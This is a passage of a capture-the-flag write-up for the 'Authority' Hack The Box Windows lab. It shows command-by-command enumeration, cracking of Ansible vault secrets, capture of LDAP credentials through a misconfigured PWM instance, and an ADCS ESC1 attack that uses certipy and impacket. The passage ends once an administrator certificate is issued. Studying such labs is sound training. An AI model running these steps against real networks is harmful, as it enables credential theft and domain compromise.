---
categories: [HTB, Medium]
---
# HTB CTF - Authority

## Box information

![](/assets/img/posts/HTB/Authority/Authority-Icon.png") {: width="250" height="250" }

Platform: Windows  Difficulty: Medium

Authority is a medium-difficulty Windows machine that highlights the dangers of misconfigurations, password reuse, storing credentials on shares, and demonstrates how default settings in Active Directory (such as the ability for all domain users to add up to 10 computers to the domain) can be combined with other issues (vulnerable AD CS certificate templates) to take over a domain. 

***

## Enumeration

### Port Scan

I like to start by gathering a list of open ports before running nmap enumeration scripts against all ports. 
This saves a bit of time on the scan and also reduces the amount of traffic sent over the network.
Starting off with a basic port scan reveals the following ports open on the machine.
```console
0ph3@parrot~$ nmap -p- --min-rate=5000 10.10.11.222
Nmap scan report for 10.10.11.222
Host is up (0.11s latency).
Not shown: 963 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
8443/tcp  open  https-alt
9389/tcp  open  adws
47001/tcp open  winrm
<SNIP>                                                                                                                                                                 
```
At a glance we can already guess this is an Active Directory (AD) domain controller (DC) just from the open ports. 
Usually the combination of Kerberos (88/TCP), ldap (389,636/TCP), microsoft-ds (445) is a good giveaway the target is acting as DC.

Using the list of open ports, we can try enumerating each service running on them.

```console
0ph3@parrot~$ nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8443,9389,47001 -sV -sC 10.10.11.222
Stats: 0:00:34 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Nmap scan report for 10.10.11.222
Host is up (0.095s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-09 23:16:35Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: othername:<unsupported>, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2024-01-09T23:17:24+00:00; +4h00m18s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2024-01-09T23:17:25+00:00; +4h00m18s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername:<unsupported>, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: othername:<unsupported>, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2024-01-09T23:17:25+00:00; +4h00m18s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2024-01-09T23:17:24+00:00; +4h00m17s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername:<unsupported>, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8443/tcp  open  ssl/https-alt
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=172.16.2.118
| Not valid before: 2024-01-07T22:24:31
|_Not valid after:  2026-01-09T10:02:55
| fingerprint-strings:
|   FourOhFourRequest, GetRequest:
|     HTTP/1.1 200
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Tue, 09 Jan 2024 23:16:41 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   HTTPOptions:
|     HTTP/1.1 200
|     Allow: GET, HEAD, POST, OPTIONS
|     Content-Length: 0
|     Date: Tue, 09 Jan 2024 23:16:41 GMT
|     Connection: close
|   RTSPRequest:
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1936
|     Date: Tue, 09 Jan 2024 23:16:47 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {fo
nt-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol [RTSP&#47;1.00x0d0x0a0x0d0x0a...]</p><p><b>Description<
/b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
9389/tcp  open  mc-nmf        .NET Message Framing
7001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.93%T=SSL%I=7%D=1/9%Time=659D9B87%P=x86_64-pc-linux-gnu
<SNIP>  
```
Immediately we can take note of the AD domain name ```authority.htb``` that ldap is leaking
```console
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: othername:<unsupported>, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2024-01-09T23:17:24+00:00; +4h00m18s from scanner time.
```

We can add this to our ```/etc/hosts``` file
```console
0ph3@parrot~$ echo '10.10.11.222 authority.htb' >> /etc/hosts
```

The nmap output has a quite a bit of of information.
It's a good idea prioritize and plan out our enumeration approach when a target has a long list of ports and services to look at.
Before diving into active directory enumeration on ldap and kerberos, let's look into other common services on the machine to get a more comprehensive information about our attack surface.


### DNS (53/TCP)
Let's try a DNS zone transfer using the domain name found from ldap
```console
0ph3@parrot~$ dig axfr authority.htb @10.10.11.222

; <<>> DiG 9.18.16-1~deb12u1~bpo11+1-Debian <<>> axfr authority.htb @10.10.11.222
;; global options: +cmd
; Transfer failed.
```
Doesn't seem zone transfers are allowed. Let's move on to enumerating the web services on the target.

### HTTP (80/TCP)
The web page on 80/TCP shows a standard IIS landing page. There does not seem to be much else here.

![IIS Default page](/assets/img/posts/HTB/Authority/IIS.png)

Directory busting doesn't prove fruitful either. 
```
0ph3@parrot~$ feroxbuster -u http://10.10.11.222

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.222
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
[####################] - 30s    30000/30000   0s      found:0       errors:0      
[####################] - 30s    30000/30000   997/s   http://10.10.11.222
```
If we wanted to go down this IIS rabbit hole we could maybe try IIS tilde enumeration. For now let's move on to the other web service.

### HTTPS (8443/TCP)
Navigating to https://10.10.11.222:8443/ redirects to a login page for a [PWM](https://github.com/pwm-project/pwm/) web application. 
Doing some research reveals PWM is a java based application that allows users to login and submit password resets through LDAP.
Trying some common default credentials on the login page does not have any sucess. It seems that the ldap connection to the directory for authentication is unavailable.
![Failed login](/assets/img/posts/HTB/Authority/PWM-Logattempt.png)
If we look below the login form, we  see a message stating the application is in configuration mode.
This misconfiguration allows us to access the ```configuration manager``` and ```configuration editor``` pages using only a password.

![](/assets/img/posts/HTB/Authority/PWM-Page.gif)

There isn't a anything else to find here. We could try bruteforce the password but there are still other services to look at. Let's continue enumerating and see if we can find anything useful on any SMB shares. 

### SMB (445/TCP)
```console
0ph3@parrot~$ netexec smb 10.10.11.222 -u 0ph3 -p '' --shares
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\0ph3: 
SMB         10.10.11.222    445    AUTHORITY        [*] Enumerated shares
SMB         10.10.11.222    445    AUTHORITY        Share           Permissions     Remark
SMB         10.10.11.222    445    AUTHORITY        -----           -----------     ------
SMB         10.10.11.222    445    AUTHORITY        ADMIN$                          Remote Admin
SMB         10.10.11.222    445    AUTHORITY        C$                              Default share
SMB         10.10.11.222    445    AUTHORITY        Department Shares                 
SMB         10.10.11.222    445    AUTHORITY        Development     READ            
SMB         10.10.11.222    445    AUTHORITY        IPC$            READ            Remote IPC
SMB         10.10.11.222    445    AUTHORITY        NETLOGON                        Logon server share 
SMB         10.10.11.222    445    AUTHORITY      
```
```netexec``` reveals the hostname of our target is AUTHORITY. We can add this to our ```/etc/hosts``` file and continue looking at our file share permissions.

It seems that we only have READ access to the ```Development``` share. Let's see what we can find!

We could use smbclient to connect to the share but mounting the share instead will make searching through directories and files easier.
```console
0ph3@parrot~$ mkdir /mnt/authority/
0ph3@parrot~$mount -t cifs //10.10.11.222/Development /mnt/authority/development/
Password for 0ph3@//10.10.11.222/Development:
```
With the share mounted, lets take a look at the contents
```console
0ph3@parrot~$ tree -L 3 /mnt/authority/development/
/mnt/authority/development/
└── Automation
    └── Ansible
        ├── ADCS
        ├── LDAP
        ├── PWM
        └── SHARE
```
The share appears to host folders for different services under the Automation/Ansible folder.
If you are unfamiliar with [Ansible](https://docs.ansible.com/ansible/latest/getting_started/introduction.html), just know that it is essentially software used to automate various tasks.
It is often used by development teams and IT professionals to automatically deploy, maintain, update and manage software/system components and configurations.
That being said, the PWM folder looks interesting. With some luck, there may be stored credentials for the configuration page.
It's also worth noting the ADCS folder. There's a good chance ADCS is installed on the DC. We can keep this in mind but for now, let's check the PWM folder.

The ```Automation/Ansible/PWM/ansible_inventory``` file seems to contain winrm credentials.
```console
0ph3@parrot~$ cat /mnt/authority/development/Automation/Ansible/PWM/ansible_inventory 
ansible_user: administrator
ansible_password: Welcome1
ansible_port: 5985
ansible_connection: winrm
ansible_winrm_transport: ntlm
ansible_winrm_server_cert_validation: ignore
```
Trying the winrm credentials against the DC fails
```console
0ph3@parrot~$ netexec winrm authority.htb -u Administrator -p Welcome1
SMB         authority.htb   5985   AUTHORITY        [*] Windows 10.0 Build 17763 (name:AUTHORITY) (domain:authority.htb)
HTTP        authority.htb   5985   AUTHORITY        [*] http://authority.htb:5985/wsman
HTTP        authority.htb   5985   AUTHORITY        [-] authority.htb\Administrator:Welcome1 
```
Trying the password for the PWM configuration manager also fails

![Failed config manager login](/assets/img/posts/HTB/Authority/Config-manager-badpw.png)

While we could try mutating the password and bruteforcing the login, This seems like a rabbit hole, especially when there is still a lot to enumerate.
After some more searching, we find some Ansible configuration values in the```PWM/defaults/main.yml``` file.
```console
0ph3@parrot~$ cat /mnt/authority/development/Automation/Ansible/PWM/defaults/main.yml 
---
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764
```
## User foothold 

### Cracking the vault secrets
The password values we are after seem to be contained in an encrypted Ansible vault. 
To extract the contents of these vaults, we need to find the secret used to encrypt them
We can use the ```ansible2john.py``` tool to convert the encrypted blobs into a hash format [hashcat](https://hashcat.net/hashcat/) can use to crack the secret.
Let's start by making sure we place each vault into its own file.
```console
0ph3@parrot~$ #ls
ldap_admin_password  pwm_admin_login  pwm_admin_password
0ph3@parrot~$ cat *
$ANSIBLE_VAULT;1.1;AES256
633038313035343032663564623737313935613133633130383761663365366662326264616536303437333035366235613437373733316635313530326639330a643034623530623439616136363563346462373361643564383830346234623235313163336231353831346562636632666539383333343238343230333633350a6466643965656330373334316261633065313363363266653164306135663764
$ANSIBLE_VAULT;1.1;AES256
326665343864353665376531366637316331386162643232303835663339663466623131613262396134353663663462373265633832356663356239383039640a346431373431666433343434366139356536343763336662346134663965343430306561653964643235643733346162626134393430336334326263326364380a6530343137333266393234336261303438346635383264396362323065313438
$ANSIBLE_VAULT;1.1;AES256
313563383439633230633734353632613235633932356333653561346162616664333932633737363335616263326464633832376261306131303337653964350a363663623132353136346631396662386564323238303933393362313736373035356136366465616536373866346138623166383535303930356637306461350a3164666630373030376537613235653433386539346465336633653630356531
```
Running ```ansible2john.py``` against all of the vault files will create a set of hashes compatible with ```hashcat``` which we will redirect to the ```ansible_hashes``` file.
```console
0ph3@parrot~$ python3 /home/orph3u5/Downloads/ansible2john.py ldap_admin_password pwm_admin_password pwm_admin_login | tee ansible_hashes
ldap_admin_password:$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635
pwm_admin_password:$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5
pwm_admin_login:$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8
```
Before running hashcat against ```ansible_hashes``` let's grep for ```Ansible``` in hashcat's ```help``` section to find the correct mode number.
```console
0ph3@parrot~$ hashcat --help |grep -i Ansible
  16900 | Ansible Vault                                    | Generic KDF
```

Running hashcat we find all three vault secrets have a cleartext value of ```!@#$%^&*```
```console
0ph3@parrot~$ hashcat -m 16900 --user ansible_hashes /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt                                                                                       
hashcat (v6.1.1) starting...
<SNIP>
Dictionary cache hit:
* Filename..: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
* Passwords.: 14344386
* Bytes.....: 139921547
* Keyspace..: 14344386

$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5:!@#$%^&*
$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8:!@#$%^&*
$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635:!@#$%^&*
                                                  
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Ansible Vault
Hash.Target......: ansible_hashes
Time.Started.....: Tue Jan  9 18:09:32 2024 (28 secs)
Time.Estimated...: Tue Jan  9 18:10:00 2024 (0 secs)
Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     4373 H/s (12.44ms) @ Accel:512 Loops:64 Thr:1 Vec:8
Recovered........: 3/3 (100.00%) Digests, 3/3 (100.00%) Salts
Progress.........: 122880/43033158 (0.29%)
Rejected.........: 0/122880 (0.00%)
Restore.Point....: 32768/14344386 (0.23%)
Restore.Sub.#1...: Salt:2 Amplifier:0-1 Iteration:9984-9999
Candidates.#1....: dumbo -> loser69
```
Now that we have the secret used to encrypt the vaults, we can extract the information contained in them using ```ansible-vault``` tool.
You can install this tool using pip.
```console
0ph3@parrot~$ pip3 install ansible-vault
```
Once installed, run the following command to extract the contents of each vault
```console
0ph3@parrot~$ ansible-vault view pwm_admin_login 
Vault password: 
svc_pwm
0ph3@parrot~$ ansible-vault view pwm_admin_password 
Vault password: 
pWm_@dm!N_!23
0ph3@parrot~$ ansible-vault view ldap_admin_password 
Vault password: 
DevT3st@123
```
### Retrieving svc_ldap's credentials
Using the password ```pWm_@dm!N_!23``` grants us access to the PWM Configuration editor.

![Sucessfully logging in to PWM Config editor](/assets/img/posts/HTB/Authority/pwm-conf-edit-login.png)

Looking around the application doesn't leak any sensitive information but there is an option to test the ldap connection and change the target ldap url which is interesting.

![Test LDAP profile functionality](/assets/img/posts/HTB/Authority/Test-LDAP-function.png)

If credentials are sent from the server when trying to establish the ldap connection to the target url, we could potentially intercept them if we change the target ldap url to our attacking machine.
Let's start by setting up our netcat listener
```console
0ph3@parrot~$ nc -nvlp 389
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::389
Ncat: Listening on 0.0.0.0:389
```
Next we will change the ldap url to point to our attacker machine.

![Changing the target LDAP url](/assets/img/posts/HTB/Authority/edit-ldap-target.png)

After clicking ```Test LDAP Profile``` on the PWM page, we receive credentials for the ```svc_ldap``` domain user on our ```netcat``` listener.
```console
0ph3@parrot~$  nc -nvlp 389
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::389
Ncat: Listening on 0.0.0.0:389
Ncat: Connection from 10.10.11.222.
Ncat: Connection from 10.10.11.222:56536.
0Y`T;CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htblDaP_1n_th3_cle4r!0P
```
> When specifying the ldap url, make sure to switch the protocol from ```ldaps://``` to ```ldap://``` otherwise the ldap request you recieve will be encrypted and certain characters received can break your terminal session.
{: .prompt-warning }

```console
0ph3@parrot~$ nc -nvlp 636
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::636
Ncat: Listening on 0.0.0.0:636
Ncat: Connection from 10.10.11.222.
Ncat: Connection from 10.10.11.222:56551.
nj$f[2%`{kd.jS% [쐪/TF!;{ܟdb,+̩0̨/̪$(#'kjg@.2-1&*%)
<SNIP>
```
These credentials allow us to connect to the DC through winrm and retrieve the user flag
```console
0ph3@parrot~$ evil-winrm -i 10.10.11.222 --user svc_ldap --password 'lDaP_1n_th3_cle4r!'
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> cd ../desktop
*Evil-WinRM* PS C:\Users\svc_ldap\desktop> dir


    Directory: C:\Users\svc_ldap\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         1/9/2024   5:26 PM             34 user.txt

```

## Privilege Escalation
### Local Enumeration
Let's gain some situational awareness about our current user to see if we are a part of any privileged groups or have any potentially eexploitable privileges.

Nothing notable for user privileges
```console
*Evil-WinRM* PS C:\Users\svc_ldap\desktop> whoami /priv
                                               
PRIVILEGES INFORMATION
----------------------    
                                               
Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

We don't see to be a member of any groups we could use to elevate privileges.
```console
*Evil-WinRM* PS C:\Users\svc_ldap\desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

We saw an ADCS folder in the Development share earlier. We can confirm if the DC ```Authority.authority.htb``` is acting as a Certificate Authority by using ```certutil -dump```.
```console
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> certutil -dump
Entry 0: (Local)
  Name:                         "AUTHORITY-CA"
  Organizational Unit:          ""
  Organization:                 ""
  Locality:                     ""
  State:                        ""
  Country/region:               ""
  Config:                       "authority.authority.htb\AUTHORITY-CA"
  Exchange Certificate:         ""
  Signature Certificate:        "authority.authority.htb_AUTHORITY-CA.crt"
  Description:                  ""
  Server:                       "authority.authority.htb"
  Authority:                    "AUTHORITY-CA"
  Sanitized Name:               "AUTHORITY-CA"
  Short Name:                   "AUTHORITY-CA"
  Sanitized Short Name:         "AUTHORITY-CA"
  Flags:                        "13"
  Web Enrollment Servers:       ""
CertUtil: -dump command completed successfully.
```

### ADCS Enumeration
With ADCS, a good place to start is enumerating the certificate templates on the server. Certificate templates are not inherently vulnerable but like with anything else Active Directory related, misconfigurations can lead to privilege escalation and even domain privilege escalation. Let's use the [certipy](https://github.com/ly4k/Certipy) tool to check if the there are any vulnerable certificate templates we can abuse. We can use certipy's ```find``` command with the ```-vulnerable``` switch to look for vulnerable certificate templates.
```console
0ph3@parrot~$ certipy find -stdout -vulnerable -text -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -target authority.htb
<SNIP>
[*] Enumeration output:                       
Certificate Authorities
  0                         
    CA Name                             : AUTHORITY-CA                  
    DNS Name                            : authority.authority.htb    
    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00  
    Certificate Validity End            : 2123-04-24 01:56:25+00:00  
    Web Enrollment                      : Disabled                       
    User Specified SAN                  : Unknown                    
    Request Disposition                 : Unknown                    
    Enforce Encryption for Requests     : Unknown                        
Certificate Templates                                                                          
  0                                                                                            
    Template Name                       : CorpVPN                        
    Display Name                        : Corp VPN                   
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True                                                                                                                                                
    Client Authentication               : True
    Enrollment Agent                    : False 
    Any Purpose                         : False 
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : AutoEnrollmentCheckUserDsCertificate
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : 16777216
                                          65536 
                                          ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False 
    Requires Key Archival               : False 
    Authorized Signatures Required      : 0
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Property Principals       : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication

```
From the output, it looks like the ```CorpVPN``` certificate is vulnerable to ESC1. A certificate template is vulnerable to this when the template allows low privileged groups, like members of Domain Users, to define an arbitrary user as the Subject Alternative Name (SAN) for a certificate request that can be used for client authentication. Effectively, a low privilege user could request a certificate with a high privilege user, like a domain admin, in the SAN and then use the certificate to authenticate as that user via kerberos to domain resources, ultimately leading to domain compromise.

### Exploiting ESC1
Currently, our plan of attack is to request a certificate with the domain admin account, ```AUTHORITY.HTB\Administrator```, defined in the SAN. We'll then use the certificate to authenticate via kerberos to the domain controller and extract the DA's nthash. With the Administrator nthash, we can pass-the-hash to connect to the DC  and retrieve the Administrator flag.

Looking at the ```certipy``` output, the only low privilege group that has enrollment rights for the template is ```AUTHORITY.HTB\Domain Computers```. We won't be able to directly use our ```svc_ldap``` user to request a certificate. We need to somehow gain access to a machine account. Fortunately for us, the ```MachineAccountQuota``` domain setting in AD allows unprivileged users the ability to add up to 10 machine accounts to the domain by default. Let's check if this setting is still set to the default value of 10, the easiest way is with netexec (formerly CrackMapExec, RIP in peace).

```console
0ph3@parrot~$ netexec ldap 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M MAQ
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
LDAPS       10.10.11.222    636    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! 
MAQ         10.10.11.222    389    AUTHORITY        [*] Getting the MachineAccountQuota
MAQ         10.10.11.222    389    AUTHORITY        MachineAccountQuota: 10
```
Nice, it looks like the default value is still in place! Let's use the ```addcomputer.py``` from the [impacket](https://github.com/fortra/impacket) toolkit to create our new machine account.
```console
0ph3@parrot~$ addcomputer.py 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' -computer-name HACK01 -computer-pass 55a4a721e13c7bcfc8ac37bf6bd287f2 -method LDAPS -dc-ip 10.10.11.222
Impacket v0.10.1.dev1+20230511.163246.f3d0b9e5 - Copyright 2022 Fortra

[*] Successfully added machine account HACK01$ with password 55a4a721e13c7bcfc8ac37bf6bd287f2.
```

With the machine account created, we can use it to request a ```CorpVPN```certificate containing the domain admin account in the SAN.
To make the request, we can use the ```certipy req command.``` We will need to supply the the CA name (```-ca```), the vulnerable template name (```-template```) and the user  to include in the SAN (```-upn```). All of the information needed to request the cert can be retrieved from the previous ```certipy find``` command output.
```console
0ph3@parrot~$ certipy req -username 'HACK01$' -password '55a4a721e13c7bcfc8ac37bf6bd287f2' -dc-ip 10.10.11.222 -ca 'AUTHORITY-CA' -template CorpVPN -upn 'administrator@authority.htb' -dns authority.htb -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.10.11.222[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.10.11.222[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 4
[*] Got certificate with multiple identifications
    UPN: 'administrator@authority.htb'
    DNS Host Name: 'authority.htb'
[*] Certificate has no object SID
